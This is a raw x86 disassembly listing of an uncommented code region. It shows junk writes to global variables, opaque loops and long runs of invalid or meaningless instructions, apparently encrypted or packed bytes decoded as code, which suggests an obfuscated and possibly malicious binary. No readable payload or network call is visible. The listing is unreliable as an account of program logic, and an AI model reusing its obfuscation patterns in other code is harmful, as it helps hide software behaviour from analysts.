  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	xor    BYTE PTR [edi],0x8c
  40e417:	jmp    0x7f12:0x7e7e9816
  40e41e:	jle    0x40e49e
  40e420:	les    ebx,FWORD PTR [esi+0x7]
  40e423:	xchg   edx,eax
  40e424:	nop
  40e425:	cli    
  40e426:	inc    edi
  40e427:	pusha  
  40e428:	stos   BYTE PTR es:[edi],al
  40e429:	or     eax,DWORD PTR [ecx-0x7c2c235]
  40e42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e430:	lock inc ecx
  40e432:	punpckhwd mm4,mm6
  40e435:	lods   eax,DWORD PTR es:[esi]
  40e437:	mov    esp,DWORD PTR [esi-0x352c55b]
  40e43d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e43e:	xor    ecx,ecx
  40e440:	or     eax,0x83c09b44
  40e445:	sbb    eax,0x117a6447
  40e44a:	push   0x4d
  40e44c:	add    al,0xeb
  40e44e:	data16 sbb dh,al
  40e451:	loope  0x40e3f0
  40e453:	mov    es,WORD PTR [esi-0x52eab21b]
  40e459:	popa   
  40e45a:	sbb    ecx,eax
  40e45c:	xchg   ebp,eax
  40e45d:	fmul   st,st(5)
  40e45f:	retf   
  40e460:	and    dl,dh
  40e462:	inc    edx
  40e463:	push   cs
  40e464:	idiv   DWORD PTR [edx+0x15]
  40e467:	cmp    al,0x1d
  40e469:	out    dx,eax
  40e46a:	sub    eax,0x1461d892
  40e46f:	mov    eax,0xe22e3f3e
  40e474:	das    
  40e475:	push   ds
  40e476:	in     al,0xfb
  40e478:	jo     0x40e4c8
  40e47a:	test   BYTE PTR [ebx+edi*4],bl
  40e47d:	jmp    0x2a77:0xefef9fe
  40e484:	rcr    DWORD PTR [edx+ebx*2],1
  40e487:	outs   dx,BYTE PTR fs:[esi]
  40e489:	mov    DWORD PTR [esi+0x7c],ecx
  40e48c:	pop    ebx
  40e48d:	add    eax,0x7585a825
  40e492:	pop    es
  40e493:	pop    es
  40e494:	ds (bad) 
  40e497:	xor    ebp,DWORD PTR [eax*8-0x4bc7536b]
  40e49e:	cmp    al,0x76
  40e4a0:	sahf   
  40e4a1:	jae    0x40e504
  40e4a3:	jg     0x40e468
  40e4a5:	ins    DWORD PTR es:[edi],dx
  40e4a6:	nop    DWORD PTR [ebx-0x4d]
  40e4aa:	sub    BYTE PTR [eax+0x4f5e73f5],bh
  40e4b0:	sub    ch,ah
  40e4b2:	jno    0x40e50f
  40e4b4:	cmp    al,0x7d
  40e4b6:	push   cs
  40e4b7:	pop    esp
  40e4b8:	dec    ebp
  40e4b9:	xor    ecx,DWORD PTR [ebp-0x42]
  40e4bc:	and    esp,DWORD PTR [eax]
  40e4be:	(bad)  
  40e4bf:	iret   
  40e4c0:	mov    ah,0xad
  40e4c2:	jnp    0x40e533
  40e4c4:	jno    0x40e531
  40e4c6:	rcr    DWORD PTR [edx+eax*8+0xc524042],cl
  40e4cd:	test   BYTE PTR [ecx],0x30
  40e4d0:	mov    ?,WORD PTR [eax+0x7d786f71]
  40e4d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4d7:	or     dh,BYTE PTR [esi-0x4ceca39a]
  40e4dd:	inc    edx
  40e4de:	sbb    ah,BYTE PTR [esi+0x26]
  40e4e1:	fwait
  40e4e2:	out    0x1a,eax
  40e4e4:	mov    ebx,0x575c2ced
  40e4e9:	or     dh,BYTE PTR [edi-0x9630721]
  40e4ef:	loopne 0x40e557
  40e4f1:	jge    0x40e552
  40e4f3:	mov    eax,0xe69fab73
  40e4f8:	ds mov edx,?
  40e4fb:	sbb    DWORD PTR [ebx],ebx
  40e4fd:	sub    edx,DWORD PTR [eax-0x2a72681f]
  40e503:	das    
  40e504:	pop    ebx
  40e505:	sahf   
  40e506:	imul   edi,DWORD PTR [ecx-0x14],0x31
  40e50a:	adc    eax,esi
  40e50c:	fsubr  DWORD PTR [ebp-0x48]
  40e50f:	icebp  
  40e510:	call   0x916ffcbe
  40e515:	cmp    DWORD PTR [eax],esi
  40e517:	push   0x7bcc9808
  40e51c:	xchg   ebp,eax
  40e51d:	cs es inc esi
  40e520:	ds sbb ebp,eax
  40e523:	xor    BYTE PTR [edi*1+0x7f241708],0xc3
  40e52b:	and    esi,esp
  40e52d:	in     eax,dx
  40e52e:	fld    DWORD PTR [ebx]
  40e530:	inc    edx
  40e531:	shr    ch,0xf2
  40e534:	dec    esp
  40e535:	or     edi,DWORD PTR [esi+0x512ef111]
  40e53b:	push   0x81f4458b
  40e540:	or     eax,0x4336a3
  40e545:	jmp    0x40e57d
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xf2f261b8
  40e5b4:	mov    cl,0xf9
  40e5b6:	xchg   edi,eax
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	add    eax,0xcf765ca
  40e5c4:	loopne 0x40e55f
  40e5c6:	pop    edi
  40e5c7:	mov    dh,0x3c
  40e5c9:	gs jg  0x40e647
  40e5cc:	out    dx,al
  40e5cd:	pop    edi
  40e5ce:	mov    ecx,0xeaa6edd2
  40e5d3:	inc    esi
  40e5d4:	xchg   esp,eax
  40e5d5:	sti    
  40e5d6:	mov    edx,0x38448e79
  40e5db:	retf   
  40e5dc:	fs jnp 0x40e57d
  40e5df:	fldcw  WORD PTR [ecx-0x46800187]
  40e5e5:	arpl   WORD PTR [esi],ax
  40e5e7:	test   DWORD PTR [ebp-0x1c],0xf3ac094f
  40e5ee:	stos   DWORD PTR es:[edi],eax
  40e5ef:	outs   dx,BYTE PTR ds:[esi]
  40e5f0:	(bad)  
  40e5f1:	push   eax
  40e5f2:	push   eax
  40e5f3:	pop    esi
  40e5f4:	and    eax,0xabda8c1
  40e5f9:	std    
  40e5fa:	out    0xf0,al
  40e5fc:	stc    
  40e5fd:	push   ebx
  40e5fe:	xor    BYTE PTR [ebx],bh
  40e600:	sub    DWORD PTR [esi-0x5c],ebx
  40e603:	jae    0x40e624
  40e605:	jne    0x40e5a3
  40e607:	and    al,0xf0
  40e609:	and    eax,0x40d3a58b
  40e60e:	cmp    DWORD PTR [esi-0x7bc0b727],ebx
  40e614:	out    0xd2,al
  40e616:	jne    0x40e64e
  40e618:	push   edx
  40e619:	pop    esp
  40e61a:	mov    dh,0x23
  40e61c:	retf   
  40e61d:	dec    edx
  40e61e:	test   cl,dh
  40e620:	mov    eax,0x10e7ffee
  40e625:	mov    ah,0x37
  40e628:	dec    edi
  40e629:	clc    
  40e62a:	les    ecx,FWORD PTR [ebp+0x6a816d9]
  40e630:	cwde   
  40e631:	lods   eax,DWORD PTR ds:[esi]
  40e632:	jno    0x40e64a
  40e634:	enter  0x7839,0xd6
  40e638:	mov    ah,0x3
  40e63a:	xlat   BYTE PTR ds:[ebx]
  40e63b:	test   eax,0xa8011f00
  40e640:	retf   0x8af9
  40e643:	push   ebp
  40e644:	xor    esp,DWORD PTR [esp+edx*2-0x1e88300]
  40e64b:	outs   dx,BYTE PTR ds:[esi]
  40e64c:	dec    esp
  40e64d:	sub    eax,0xf0e42827
  40e652:	mov    cs,WORD PTR [eax+0x35]
  40e655:	mov    dh,0x19
  40e657:	test   al,0x80
  40e659:	gs rcl ch,1
  40e65c:	sub    DWORD PTR [edi-0x51ec9703],edi
  40e662:	or     ch,BYTE PTR [ebx-0x625d4544]
  40e668:	addr16 add al,0x3
  40e66b:	sub    bl,BYTE PTR [edi+esi*1]
  40e66e:	ja     0x40e624
  40e670:	or     ecx,esp
  40e672:	inc    eax
  40e673:	push   0x46
  40e675:	xchg   ebx,eax
  40e676:	outs   dx,DWORD PTR ds:[esi]
  40e677:	fimul  DWORD PTR [eax+0x63]
  40e67a:	add    edx,esi
  40e67c:	sbb    BYTE PTR [esi+0x1c99c5f5],0x73
  40e683:	div    DWORD PTR [eax+ebp*8-0x44]
  40e687:	shr    ebx,0xac
  40e68a:	push   cs
  40e68b:	dec    ecx
  40e68c:	pop    edi
  40e68d:	xor    edx,esp
  40e68f:	out    dx,al
  40e690:	sahf   
  40e691:	fstp   DWORD PTR [edi-0x1d]
  40e694:	in     al,dx
  40e695:	rol    BYTE PTR [eax+0x61],cl
  40e698:	popf   
  40e699:	fist   DWORD PTR [ebp-0x54]
  40e69c:	(bad)  
  40e69d:	jmp    ecx
  40e69f:	das    
  40e6a0:	sub    bl,BYTE PTR [ebx]
  40e6a2:	lods   al,BYTE PTR ds:[esi]
  40e6a3:	jmp    0x40e66e
  40e6a5:	jb     0x40e704
  40e6a7:	aad    0x4b
  40e6a9:	ror    DWORD PTR [ecx+0x60d5f796],0x5d
  40e6b0:	pop    es
  40e6b1:	sahf   
  40e6b2:	or     eax,0x6ffe3da3
  40e6b7:	adc    eax,0xc79250fc
  40e6bc:	pop    ecx
  40e6bd:	push   ss
  40e6be:	adc    edi,DWORD PTR [ebp-0x44]
  40e6c1:	and    ecx,DWORD PTR [edi+0x28]
  40e6c4:	jmp    ebp
  40e6c6:	push   ds
  40e6c7:	(bad)  
  40e6c8:	leave  
  40e6c9:	addr16 push es
  40e6cb:	(bad)  
  40e6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6cd:	mov    dh,0xab
  40e6cf:	enter  0xb462,0xbe
  40e6d3:	sub    DWORD PTR [edi-0x5d],edx
  40e6d6:	dec    edx
  40e6d7:	fistp  WORD PTR [eax+0x34a1bb48]
  40e6dd:	cmp    eax,DWORD PTR [ecx+0x0]
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x7ec76a4c]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6a5
  40e704:	sub    ecx,DWORD PTR [edx]
  40e706:	sbb    eax,0xb68541d8
  40e70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e70c:	std    
  40e70d:	add    bh,BYTE PTR [ebx]
  40e70f:	dec    eax
  40e710:	test   BYTE PTR [edi-0xc],0xdc
  40e714:	in     al,0xa4
  40e716:	clc    
  40e717:	cld    
  40e718:	shl    DWORD PTR [eax+0x63],0xec
  40e71c:	inc    esi
  40e71d:	shl    DWORD PTR [esp+esi*2],cl
  40e720:	rol    DWORD PTR [ebp-0x40],0x28
  40e724:	lahf   
  40e725:	(bad)  
  40e726:	aad    0xfb
  40e728:	icebp  
  40e729:	stos   DWORD PTR es:[edi],eax
  40e72a:	xchg   esi,eax
  40e72b:	xor    BYTE PTR [ebx],dl
  40e72d:	cmp    eax,0x625dfde3
  40e732:	rcl    DWORD PTR [ecx+0x1eac9cbd],0x28
  40e739:	mov    WORD PTR [ebx],ds
  40e73b:	sbb    BYTE PTR [ecx],bh
  40e73d:	sub    bl,0xf7
  40e740:	cdq    
  40e741:	neg    BYTE PTR [edx]
  40e743:	mov    eax,0xbcd39ac
  40e748:	fwait
  40e749:	push   edi
  40e74a:	add    BYTE PTR [esi-0x6efc9489],0x43
  40e751:	stos   BYTE PTR es:[edi],al
  40e752:	pop    ecx
  40e753:	mov    ds:0xba7b4a20,eax
  40e758:	outs   dx,BYTE PTR ds:[esi]
  40e759:	fs jmp 0x1187207a
  40e75f:	aaa    
  40e760:	outs   dx,BYTE PTR ds:[esi]
  40e761:	retf   0xf40b
  40e764:	mov    al,0x45
  40e766:	push   cs
  40e767:	sbb    al,0xd9
  40e769:	les    ecx,FWORD PTR [ebx-0x11b120b]
  40e76f:	rcr    DWORD PTR [ecx],cl
  40e771:	adc    edi,DWORD PTR [ebx]
  40e773:	jecxz  0x40e717
  40e775:	or     DWORD PTR es:[edx+eax*4+0x690eb7ed],0x7dffd159
  40e781:	cmp    al,0x85
  40e783:	sbb    eax,0x4ba5aba8
  40e788:	xor    BYTE PTR [eax-0x1f712c4c],0xc8
  40e78f:	hlt    
  40e790:	inc    ebp
  40e791:	adc    eax,0xe0897c
  40e796:	shl    BYTE PTR [ebp-0x7],cl
  40e799:	test   DWORD PTR [eax],edi
  40e79b:	or     ecx,edx
  40e79d:	out    dx,eax
  40e79e:	je     0x40e7c1
  40e7a0:	jno    0x40e78b
  40e7a2:	push   0xffffffe2
  40e7a4:	sub    bl,ah
  40e7a6:	pushf  
  40e7a7:	scas   eax,DWORD PTR es:[edi]
  40e7a8:	call   0x6e59ad3a
  40e7ad:	push   esp
  40e7ae:	pop    ebp
  40e7af:	je     0x40e7c0
  40e7b1:	bts    eax,0x99
  40e7b5:	xchg   ecx,eax
  40e7b6:	mov    dh,0x68
  40e7b8:	std    
  40e7b9:	sbb    BYTE PTR [eax],cl
  40e7bb:	sahf   
  40e7bc:	lods   al,BYTE PTR ds:[esi]
  40e7bd:	inc    ebp
  40e7be:	out    0x58,al
  40e7c0:	mov    bl,0xdd
  40e7c2:	mov    ebp,0x15c7ce63
  40e7c7:	xor    esp,eax
  40e7c9:	pushf  
  40e7ca:	loop   0x40e766
  40e7cc:	xor    BYTE PTR [ebp+0x7c],bh
  40e7cf:	mov    ah,0x7e
  40e7d1:	rcl    BYTE PTR [eax+0x75dc1df3],1
  40e7d7:	pop    edi
  40e7d8:	ins    BYTE PTR es:[edi],dx
  40e7d9:	jge    0x40e835
  40e7db:	inc    esi
  40e7dc:	inc    ecx
  40e7dd:	pop    esi
  40e7de:	push   es
  40e7df:	or     edx,DWORD PTR [ebp+0x667016da]
  40e7e5:	inc    eax
  40e7e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7e7:	pop    ebp
  40e7e8:	repz push 0xf57d8199
  40e7ee:	mov    ?,WORD PTR [edi]
  40e7f0:	scas   al,BYTE PTR es:[edi]
  40e7f1:	xor    BYTE PTR [ecx+esi*2-0x2995c50d],cl
  40e7f8:	xchg   BYTE PTR [esp+eiz*8],ch
  40e7fb:	add    al,0xfa
  40e7fd:	and    eax,0x248d6f3e
  40e802:	mov    eax,ds:0x89278f77
  40e807:	jno    0x40e7ac
  40e809:	in     al,dx
  40e80a:	pop    es
  40e80b:	imul   ecx,DWORD PTR gs:[eax],0xc077ccbb
  40e812:	mov    esp,0x7a970569
  40e817:	arpl   cx,si
  40e819:	mov    al,ds:0x4946a3e5
  40e81e:	and    ecx,DWORD PTR [ecx+0x458bfc45]
  40e824:	cld    
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e847
  40e854:	xchg   edi,eax
  40e855:	or     BYTE PTR [ecx-0x1e],0xa7
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e874
  40e860:	push   ecx
  40e861:	and    DWORD PTR [eax],edi
  40e863:	popa   
  40e864:	iret   
  40e865:	push   esi
  40e866:	dec    ebx
  40e867:	push   ebx
  40e868:	push   ebx
  40e869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e86a:	adc    BYTE PTR [eax+0x67c61f84],cl
  40e870:	and    eax,DWORD PTR [ecx-0x668ea97e]
  40e876:	add    BYTE PTR [edi],bl
  40e878:	lods   eax,DWORD PTR ds:[esi]
  40e879:	add    eax,0x679b6519
  40e87e:	push   0x528592c6
  40e883:	call   0xe07aca9c
  40e888:	mov    al,ds:0x6f78ef0b
  40e88d:	enter  0xec8d,0x81
  40e891:	jl     0x40e8bd
  40e893:	mov    dh,BYTE PTR [ebx+0x21]
  40e896:	mov    gs,WORD PTR [edi+esi*2]
  40e899:	adc    eax,0xcb771929
  40e89e:	cmp    DWORD PTR [ebp+eiz*1-0x16],esp
  40e8a2:	add    DWORD PTR [edi+esi*1],edx
  40e8a5:	jno    0x40e8e6
  40e8a7:	popa   
  40e8a8:	jle    0x40e910
  40e8aa:	mov    BYTE PTR ds:0xec03eb8b,ch
  40e8b0:	ficom  WORD PTR [edi]
  40e8b2:	jmp    0x1cc:0xb5b32b1a
  40e8b9:	fsubr  QWORD PTR [esi]
  40e8bb:	mov    al,0xad
  40e8bd:	dec    ebp
  40e8be:	dec    eax
  40e8bf:	in     al,dx
  40e8c0:	sub    al,bh
  40e8c2:	pop    edi
  40e8c3:	repz cmp esp,edi
  40e8c6:	imul   esp,edi,0x3f01c1d7
  40e8cc:	daa    
  40e8cd:	add    dl,BYTE PTR ds:0xae17a60d
  40e8d3:	cmp    bh,BYTE PTR [ebp+edi*8+0x39]
  40e8d7:	push   eax
  40e8d8:	in     al,dx
  40e8d9:	dec    edi
  40e8da:	pop    edx
  40e8db:	fwait
  40e8dc:	jb     0x40e927
  40e8de:	das    
  40e8df:	es mov dh,0xaa
  40e8e2:	add    DWORD PTR [ecx-0x6ef4e867],ecx
  40e8e8:	fisubr DWORD PTR [ebp+0x378ff831]
  40e8ee:	mov    DWORD PTR [ebx],eax
  40e8f0:	add    ebp,DWORD PTR [eax]
  40e8f2:	jl     0x40e88c
  40e8f4:	add    DWORD PTR [edi],edx
  40e8f6:	and    esi,edi
  40e8f8:	fidivr DWORD PTR ds:0xe131a2ff
  40e8fe:	inc    ebp
  40e8ff:	mov    ch,0x2a
  40e901:	push   0x5a
  40e903:	hlt    
  40e904:	mov    eax,ds:0x91ea551e
  40e909:	dec    eax
  40e90a:	inc    esp
  40e90b:	popf   
  40e90c:	xor    esp,DWORD PTR [eax+0x5c150794]
  40e912:	lds    edx,FWORD PTR [eax-0x60039d90]
  40e918:	cmp    DWORD PTR ds:0x910f10a2,edx
  40e91e:	imul   edi,esp,0x730bbde5
  40e924:	gs shl esp,1
  40e927:	jne    0x40e937
  40e929:	ret    
  40e92a:	push   esi
  40e92b:	aas    
  40e92c:	sub    DWORD PTR [ebx-0x43],ebx
  40e92f:	jl     0x40e995
  40e931:	add    al,0x7
  40e933:	add    DWORD PTR [esi+0x624f5dc9],edi
  40e939:	out    dx,al
  40e93a:	pop    ss
  40e93b:	fiadd  WORD PTR [ebx+ebp*1-0x39d7a361]
  40e942:	rol    BYTE PTR [edi-0x21],cl
  40e945:	fmul   st(1),st
  40e947:	jae    0x40e8e7
  40e949:	cld    
  40e94a:	sbb    esp,DWORD PTR [ecx+0x6d]
  40e94d:	sbb    ch,bh
  40e94f:	(bad)  
  40e950:	imul   esp,DWORD PTR [ecx],0xffffffc9
  40e953:	inc    ecx
  40e954:	mov    esi,0xbc6e7752
  40e959:	sbb    eax,0xe3e3ea5c
  40e95e:	in     al,dx
  40e95f:	bound  esp,QWORD PTR [ebx]
  40e961:	call   0x3ca:0x3feabc82
  40e968:	sbb    al,0xc0
  40e96a:	imul   ecx,ebp,0xf16f83d4
  40e970:	or     ch,ah
  40e972:	cmp    bl,al
  40e974:	pushf  
  40e975:	aam    0x6e
  40e977:	ficom  WORD PTR [ebx-0x7af0dc42]
  40e97d:	ds stc 
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x6e26f31d
  40e99c:	scas   al,BYTE PTR es:[edi]
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e947
  40e9a6:	imul   ecx,DWORD PTR [ebx+0x68116753],0xe6482358
  40e9b0:	inc    esp
  40e9b1:	pop    es
  40e9b2:	(bad)  
  40e9b4:	rcl    ch,cl
  40e9b6:	and    ecx,DWORD PTR [ebx+edi*1+0x65]
  40e9ba:	repnz scas eax,DWORD PTR es:[edi]
  40e9bc:	mov    ecx,0x1e5b88c4
  40e9c1:	mov    BYTE PTR [edi+0x5aa5b7da],bl
  40e9c7:	and    DWORD PTR [ecx],0x86b6772d
  40e9cd:	adc    BYTE PTR [edi+0x5c],bl
  40e9d0:	xor    eax,DWORD PTR [edx+0x697876f8]
  40e9d6:	lds    ebp,FWORD PTR [edx-0x5b]
  40e9d9:	sub    bh,al
  40e9db:	test   al,0x5f
  40e9dd:	inc    ecx
  40e9de:	and    DWORD PTR [ebp-0x19],ebp
  40e9e1:	push   ecx
  40e9e2:	loope  0x40e9f7
  40e9e4:	mov    WORD PTR [edi+0x226149e],ss
  40e9ea:	add    eax,0xeea41433
  40e9ef:	pop    ebp
  40e9f0:	push   edi
  40e9f1:	in     al,dx
  40e9f2:	xchg   ebx,eax
  40e9f3:	clc    
  40e9f4:	retf   
  40e9f5:	cmc    
  40e9f6:	sahf   
  40e9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f8:	shl    edi,cl
  40e9fa:	or     DWORD PTR [esi+0x3a0801e1],ecx
  40ea00:	adc    BYTE PTR [ecx],0x39
  40ea03:	test   BYTE PTR [esi+edx*8+0x25],dh
  40ea07:	aas    
  40ea08:	dec    edi
  40ea09:	cmc    
  40ea0a:	cld    
  40ea0b:	in     al,0xe0
  40ea0d:	jmp    0x40e9bb
  40ea0f:	adc    eax,0x24a3b606
  40ea14:	jge    0x40e9fd
  40ea16:	pushf  
  40ea17:	(bad)  
  40ea1b:	jmp    0x71b1f71f
  40ea20:	arpl   cx,bp
  40ea22:	push   edx
  40ea23:	fs je  0x40ea7f
  40ea26:	test   eax,0x206e599a
  40ea2b:	xchg   ebx,eax
  40ea2c:	int3   
  40ea2d:	pop    ecx
  40ea2e:	jbe    0x40ea89
  40ea30:	push   es
  40ea31:	jnp    0x40ea51
  40ea33:	jl     0x40ea9d
  40ea35:	add    eax,0xa9bf39df
  40ea3a:	test   DWORD PTR [esi+0x63d704bf],0x7bc2ac39
  40ea44:	inc    BYTE PTR [eax]
  40ea46:	push   edi
  40ea47:	out    dx,al
  40ea48:	aaa    
  40ea49:	dec    esi
  40ea4a:	in     eax,0x66
  40ea4c:	dec    esi
  40ea4d:	aam    0x35
  40ea4f:	aaa    
  40ea50:	ins    DWORD PTR es:[edi],dx
  40ea51:	pop    ebp
  40ea52:	sbb    bh,BYTE PTR [ebx]
  40ea54:	bound  eax,QWORD PTR [esi]
  40ea56:	test   DWORD PTR [edx+esi*2],0xf70d664
  40ea5d:	jo     0x40e9f1
  40ea5f:	mov    DWORD PTR [ebx+0x26],edx
  40ea62:	ret    
  40ea63:	fidiv  WORD PTR [eax]
  40ea65:	push   edi
  40ea66:	sub    DWORD PTR [esi-0x2f],eax
  40ea69:	mov    al,ds:0x78ee6ac6
  40ea6e:	cli    
  40ea6f:	jbe    0x40ea7d
  40ea71:	por    mm5,QWORD PTR [ebx+esi*1-0xec3b50b]
  40ea79:	add    BYTE PTR [eax-0xa67ea39],0x4
  40ea80:	dec    ebp
  40ea81:	ss push es
  40ea83:	dec    edi
  40ea84:	mov    ds:0x1c2b6027,eax
  40ea89:	test   eax,0x2ffbfe14
  40ea8e:	or     al,bl
  40ea90:	mov    eax,0xb1d744d8
  40ea95:	shl    DWORD PTR [edx+0x59],1
  40ea98:	lahf   
  40ea99:	inc    edi
  40ea9a:	jl     0x40eacc
  40ea9c:	les    esp,FWORD PTR [edi-0x1c]
  40ea9f:	mov    ebx,0xe8eac236
  40eaa4:	and    DWORD PTR [ecx+esi*8+0x74e585df],ecx
  40eaab:	inc    ebp
  40eaac:	fsub   QWORD PTR [edx+0x29]
  40eaaf:	adc    ch,BYTE PTR ds:0x63483ab0
  40eab5:	popa   
  40eab6:	jae    0x40eb05
  40eab8:	rcr    BYTE PTR [edx],0xaa
  40eabb:	adc    ah,BYTE PTR [esi+edx*4]
  40eabe:	push   ebx
  40eabf:	mov    dh,0x7e
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
